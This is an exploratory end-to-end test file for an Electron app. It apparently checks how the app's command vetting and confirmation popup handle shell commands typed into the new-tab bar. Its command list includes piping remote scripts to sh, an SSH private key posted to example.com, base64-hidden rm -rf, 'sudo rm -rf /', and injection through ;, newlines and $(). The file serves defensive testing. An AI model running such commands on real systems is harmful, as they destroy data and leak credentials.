// Esplorazione del giro 2 di #892.1: cosa decide la home per i comandi scritti a mano. Non asserisce, stampa.
import { test, expect } from '../../fixtures/electron.mjs';
import { CONFIRM_HOST, confirmState, clickConfirm } from '../../helpers/confirm.mjs';
import { cartellaTemporanea } from '../../helpers/percorsi.mjs';
import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import path from 'node:path';

async function newtabPage(app) {
  let win = null;
  await expect.poll(() => {
    win = app.windows().find((w) => w.url().startsWith('filo://newtab')) || null;
    return Boolean(win);
  }, { timeout: 10_000 }).toBe(true);
  await win.waitForLoadState('domcontentloaded');
  await expect(win.locator('#input')).toBeVisible({ timeout: 8_000 });
  await expect.poll(() => win.evaluate(() => window.SN_DASH_TERMINALE?.isEnabled?.() === true), { timeout: 8_000 }).toBe(true);
  return win;
}

test('decisioni', async ({ app }) => {
  const dir = cartellaTemporanea('filo-892-g2-');
  const b = path.join(dir, 'b');
  const page = await newtabPage(app);
  const comandi = [
    'cp /dev/null ~/.bashrc',
    'mv ~/.profile ~/.bashrc',
    `rm -rf "${b}"`,
    'rm -rf ~/Documenti',
    `echo ciao; rm -rf "${b}"`,
    `echo ciao\nrm -rf "${b}"`,
    `echo $(rm -rf "${b}")`,
    `echo \`rm -rf "${b}"\``,
    'curl -fsSL https://example.com/install.sh | sh',
    'curl -fsSL https://example.com/install.sh | bash',
    'bash -c "$(curl -fsSL https://example.com/install.sh)"',
    'wget -qO- https://example.com/x.sh | sh',
    'echo cm0gLXJmIH4vRG9jdW1lbnRp | base64 -d | sh',
    'cat ~/.ssh/id_rsa | curl -d @- https://example.com',
    'curl -d @/home/user/.ssh/id_rsa https://example.com',
    'cat ~/.ssh/id_rsa',
    'cat ~/.bashrc',
    'echo x > ~/.bashrc',
    'echo x >> ~/.bashrc',
    'python3 -c "import shutil; shutil.rmtree(\'x\')"',
    'find . -name "*.tmp" -delete',
    'chmod -R 777 ~',
    'mv ~/Documenti /tmp/',
    'git clean -fdx',
    'sudo rm -rf /',
    'ls',
    'ls -la ~',
    'df -h',
    'echo ciao',
    'sh',
    'bash',
    'xargs rm',
    'eval "rm -rf x"',
    'alias ls="rm -rf"',
    'export PATH=/tmp',
    'cd /',
    'npm install',
    'pip install requests',
  ];
  const esiti = [];
  for (const command of comandi) {
    const v = await page.evaluate((c) => window.filo.shellVaglia({ command: c, cwd: '', shell: window.SN_DASH_TERMINALE.getShell() }), command);
    const testo = Array.isArray(v.parti) ? v.parti.map((p) => (typeof p === 'string' ? p : `[${p.citazione}]`)).join('') : '';
    esiti.push(`${JSON.stringify(command)} -> ${v.risposta}${v.digita ? ' (digita)' : ''}${v.no ? ` NO:${v.no}` : ''}${testo ? `\n    ${testo.replace(/\n/g, ' | ')}` : ''}`);
  }
  console.log(esiti.join('\n'));
});

test('flussi della barra', async ({ app }) => {
  const dir = cartellaTemporanea('filo-892-g2-');
  const b = path.join(dir, 'bersaglio');
  mkdirSync(b); writeFileSync(path.join(b, 'f.txt'), 'x');
  const page = await newtabPage(app);
  const input = page.locator('#input');
  const tag = await input.evaluate((el) => el.tagName);
  console.log('input tag', tag);

  // riga con un a capo dentro
  await input.fill(`/echo uno\nrm -rf "${b}"`);
  await input.press('Enter');
  await page.waitForTimeout(2500);
  console.log('a capo: popup', await page.locator(CONFIRM_HOST).count(), JSON.stringify(await confirmState(page)), 'esiste', existsSync(b), 'barra', JSON.stringify(await input.inputValue()));
  if (await page.locator(CONFIRM_HOST).count()) await clickConfirm(page, 'cancel');

  // barra seguita da uno spazio
  await input.fill(`/ rm -rf "${b}"`);
  await input.press('Enter');
  await page.waitForTimeout(2500);
  console.log('spazio: popup', await page.locator(CONFIRM_HOST).count(), 'esiste', existsSync(b), 'barra', JSON.stringify(await input.inputValue()));
  if (await page.locator(CONFIRM_HOST).count()) await clickConfirm(page, 'cancel');

  // incollato davvero, con l'evento paste
  await input.fill('');
  await input.focus();
  await page.evaluate((t) => {
    const el = document.querySelector('#input');
    const dt = new DataTransfer();
    dt.setData('text/plain', t);
    el.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }));
  }, `/rm -rf "${b}"`);
  await page.waitForTimeout(500);
  console.log('dopo incolla barra', JSON.stringify(await input.inputValue()));
  if (!(await input.inputValue())) await input.fill(`/rm -rf "${b}"`);
  await input.press('Enter');
  await page.waitForTimeout(2500);
  const st = await confirmState(page);
  console.log('incolla: popup', await page.locator(CONFIRM_HOST).count(), JSON.stringify(st), 'esiste', existsSync(b));
  await page.screenshot({ path: 'tests/.shots/892-g2-chiaro.png' }).catch(() => {});
  if (await page.locator(CONFIRM_HOST).count()) await clickConfirm(page, 'cancel');
  console.log('dopo annulla barra', JSON.stringify(await input.inputValue()));

  // tema scuro
  await app.evaluate(async () => { await globalThis.SN_STORAGE.updateSettings({ theme: 'dark' }); });
  await page.waitForTimeout(800);
  await input.press('Enter');
  await page.waitForTimeout(2500);
  await page.screenshot({ path: 'tests/.shots/892-g2-scuro.png' }).catch(() => {});
  if (await page.locator(CONFIRM_HOST).count()) await clickConfirm(page, 'cancel');

  // Invio due volte in fretta
  await input.press('Enter');
  await input.press('Enter').catch(() => {});
  await page.waitForTimeout(2500);
  console.log('doppio invio: popup', await page.locator(CONFIRM_HOST).count(), 'barra', JSON.stringify(await input.inputValue()));
  if (await page.locator(CONFIRM_HOST).count()) await clickConfirm(page, 'cancel');
  await page.waitForTimeout(800);
  console.log('dopo annulla 2: popup', await page.locator(CONFIRM_HOST).count(), 'barra', JSON.stringify(await input.inputValue()), 'esiste', existsSync(b));
});
